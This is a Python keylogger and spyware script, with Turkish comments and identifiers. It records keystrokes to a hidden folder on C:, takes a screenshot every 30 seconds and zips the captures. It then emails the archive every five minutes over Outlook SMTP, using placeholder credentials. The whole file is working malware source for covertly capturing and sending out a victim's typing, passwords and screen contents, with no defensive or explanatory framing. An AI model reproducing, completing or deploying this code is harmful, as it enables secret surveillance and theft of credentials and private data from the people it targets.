import os
import pyautogui
import time
import threading
import glob
import zipfile
import smtplib
from pynput.keyboard import Key, Listener
from email import encoders
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase

if os.path.exists("C:\\Picture\\"):
    zipfile.ZipFile("C:\\Picture\\arsiv.zip", "w")
    pass
else:
    os.mkdir('C:\\Picture')
    os.mkdir('C:\\Picture\\Default')
    zipfile.ZipFile("C:\\Picture\\arsiv.zip", "w")
    pass
 
keys = []
count = 0
def keyboard():
    count = 0
    keys = []
    def on_press(key):
        global keys, count
        keys.append(key)
        count += 1
    
        if count >= 10:
            write_file(keys)
            keys = []
            count = 0
    
    def write_file(keys):
        with open("C:\\Picture\\Default\\logs.txt", "a") as file:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    file.write("\n")
                elif k.find("Key"):
                    file.write(str(k))
    
    def on_release(key):
        if key == Key.esc:
            return False
    
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
        
def ss():
        threading.Timer(30.0, ss).start()
        # Pyautogui ile ekran görüntüsünü alıyoruz.
        ekran_goruntusu = pyautogui.screenshot()
        dosya_adi = str(time.time_ns()) + ".jpg"
        dosya_yolu = os.path.join('C:\\Picture\\Default', dosya_adi)
        ekran_goruntusu.save(dosya_yolu)

def rar():
    arsivlenecekDosyalar=[]
    threading.Timer(280.0, rar).start()
    for belge in glob.iglob("C:\\Picture\\Default\\**/*", recursive=True):
        arsivlenecekDosyalar.append(belge)
    with zipfile.ZipFile("C:\\Picture\\arsiv.zip", "w") as arsiv:
        for dosya in arsivlenecekDosyalar:
            arsiv.write(dosya)
        
def mail():
    threading.Timer(300.0, mail).start()
    yoladres = "sendmail"
    aliciadres = "receivermail"

    msg = MIMEMultipart()
    msg['from'] = yoladres
    msg['to'] = aliciadres
    msg['Konu'] = "Bazı Önemli formlar"

    konu = "Aşagida ekte bulabilirsin: "
    msg.attach(MIMEText(konu, 'plain'))
    dosyaismi = "arsiv.zip"
    attachment = open("C:\\Picture\\arsiv.zip", "rb")

    part = MIMEBase('application', 'octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= %s" % dosyaismi)

    msg.attach(part)

    server = smtplib.SMTP('smtp.outlook.com', 587)
    server.starttls()
    server.login(yoladres,"sendmail-password")
    text = msg.as_string()
    server.sendmail(yoladres, aliciadres, text)
    server.quit()

if __name__ == '__main__':
    t1 = threading.Thread(target=keyboard)
    t2 = threading.Thread(target=ss)
    t3 = threading.Thread(target=rar)
    t4 = threading.Thread(target=mail)
    t1.start()
    t2.start()
    t3.start()
    t4.start()

#onurkya7








